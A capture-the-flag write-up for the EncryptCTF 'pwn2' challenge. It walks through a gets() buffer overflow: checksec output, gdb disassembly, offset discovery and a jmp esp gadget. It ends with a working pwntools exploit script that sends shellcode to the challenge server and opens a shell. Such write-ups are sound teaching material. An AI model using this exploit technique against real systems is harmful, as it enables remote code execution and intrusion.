## EncryptCTF: pwn2
##### *tl;dr: buffer overflow to execute shellcode*
#### In this challenge, we take advantage of another vulnerable gets function which allows us to overwrite the instruction pointer. While doing this, I have learned a new tool called a ```ROP_gadget``` to jump to the stack and run our shellcode. Before we head onto that, we perform a security measures recon:
```
$ checksec pwn2
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
#### We see that there is no canary and the NX bit for the stack is disabled. Before we head on to disassemble the binary, let's have a test run at it:
```
$ ./pwn2
$ ls
pwn2
Bye!

$ ./pwn2
$ cat *
bash: command not found: cat *
Bye!

$ ./pwn2
$ cd ..
bash: command not found: cd ..
Bye!
```
#### We see that it gives us a shell, but we can only execute ls and no other commands. To have a better understanding for our would be exploit, let's analyze the binary through gdb and examine the functions:
```
$ gdb ./pwn2
  gdb-peda$ info functions
    [...]
    0x0804852d  run_command_ls
    0x08048541  lol
    0x08048548  main
```
#### We see here some interesting functions such as lol and run_command_ls. Let's disassemble the main function first:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048548 <+0>:	  push   ebp
   0x08048549 <+1>:	  mov    ebp,esp
   0x0804854b <+3>:	  and    esp,0xfffffff0
   0x0804854e <+6>: 	sub    esp,0x30
   0x08048551 <+9>:	  mov    eax,ds:0x804a040
   0x08048556 <+14>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804855e <+22>:	mov    DWORD PTR [esp+0x8],0x2
   0x08048566 <+30>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804856e <+38>:	mov    DWORD PTR [esp],eax
   0x08048571 <+41>:	call   0x8048420 <setvbuf@plt>
   0x08048576 <+46>:	mov    DWORD PTR [esp],0x8048673
   0x0804857d <+53>:	call   0x80483c0 <printf@plt>
   0x08048582 <+58>:	lea    eax,[esp+0x10]
   0x08048586 <+62>:	mov    DWORD PTR [esp],eax
   0x08048589 <+65>:	call   0x80483d0 <gets@plt>
   0x0804858e <+70>:	mov    DWORD PTR [esp+0x4],0x8048670
   0x08048596 <+78>:	lea    eax,[esp+0x10]
   0x0804859a <+82>:	mov    DWORD PTR [esp],eax
   0x0804859d <+85>:	call   0x80483b0 <strcmp@plt>
   0x080485a2 <+90>:	test   eax,eax
   0x080485a4 <+92>:	jne    0x80485ad <main+101>
   0x080485a6 <+94>:	call   0x804852d <run_command_ls>
   0x080485ab <+99>:	jmp    0x80485c1 <main+121>
   0x080485ad <+101>:	lea    eax,[esp+0x10]
   0x080485b1 <+105>:	mov    DWORD PTR [esp+0x4],eax
   0x080485b5 <+109>:	mov    DWORD PTR [esp],0x8048676
   0x080485bc <+116>:	call   0x80483c0 <printf@plt>
   0x080485c1 <+121>:	mov    DWORD PTR [esp],0x8048693
   0x080485c8 <+128>:	call   0x80483e0 <puts@plt>
   0x080485cd <+133>:	mov    eax,0x0
   0x080485d2 <+138>:	leave  
   0x080485d3 <+139>:	ret    
End of assembler dump.

gdb-peda$ disas run_command_ls 
Dump of assembler code for function run_command_ls:
   0x0804852d <+0>:	push   ebp
   0x0804852e <+1>:	mov    ebp,esp
   0x08048530 <+3>:	sub    esp,0x18
   0x08048533 <+6>:	mov    DWORD PTR [esp],0x8048670
   0x0804853a <+13>:	call   0x80483f0 <system@plt>
   0x0804853f <+18>:	leave  
   0x08048540 <+19>:	ret    
End of assembler dump.
```
#### We see interesting calls such as our vulnerable entry point, gets. After we input something, it is run through an ```strcmp``` call which compares if our input is equal to the string ```ls```, if it is then it proceeds to call the function run_command_ls which basically just executes the ls command in the shell. To begin our exploit, we first find an offset which we can overflow the buffer - and we can do a pattern create for this:
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
$ AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
[...]
EIP: 0x41414641 ('AFAA')
Stopped reason: SIGSEGV
0x41414641 in ?? ()

gdb-peda$ pattern offset AFAA
AFAA found at offset: 44
```
#### We found out that we can overflow the buffer and be able to overwrite the instruction pointer with offset 44. After this, we'd want to jump to the stack. We can simply put a breakpoint in main, run it, and get the esp register but we'll be implementing what we have learned. There's still one function we didn't disassemble, lol:
```
gdb-peda$ disas lol
Dump of assembler code for function lol:
   0x08048541 <+0>:	push   ebp
   0x08048542 <+1>:	mov    ebp,esp
   0x08048544 <+3>:	jmp    esp
   0x08048546 <+5>:	pop    ebp
   0x08048547 <+6>:	ret    
End of assembler dump.
```
#### Now were talking, at address ```0x08048544``` is a ```rop_gadget```, we see a ```jmp esp``` instruction which if we execute, will point us into the stack where we can place our shellcode. We can also get our rop gadget with the ROPgadget utility:
```
$ ROPgadget --binary ./pwn2 --only "jmp"
Gadgets information
============================================================
0x08048544 : jmp esp

Unique gadgets found: 1
```
#### We can now jump to this address and place our shellcode in the stack. The shellcode which we'll be using will be the ones from pwntools. Now that we have everything we need, we proceed to create our exploit script.
##### exploit.py
```
from pwn import *

#: Connect to challenge server
HOST = '104.154.106.182'
PORT = 3456
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 44
jmp_esp = p32(0x08048544)
shellcode = asm(shellcraft.sh())
exploit = offset + jmp_esp + shellcode

#: Send payload
p.sendline(exploit)
print(p.recv())
p.interactive()
```
#### We can now run our exploit, interact with our shell, and get the flag! :)
```
$ python exploit.py
[+] Opening connection to 104.154.106.182 on port 3456: Done
$ 
bash: command not found: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD\x85\x0jhh///sh/bin\x89�h\x814$ri1�Qj\x04Y�Q��1�j\x0bX̀
Bye!

[*] Switching to interactive mode
$ ls
flag.txt
pwn2
$ cat flag.txt
encryptCTF{N!c3_j0b_jump3R}
```



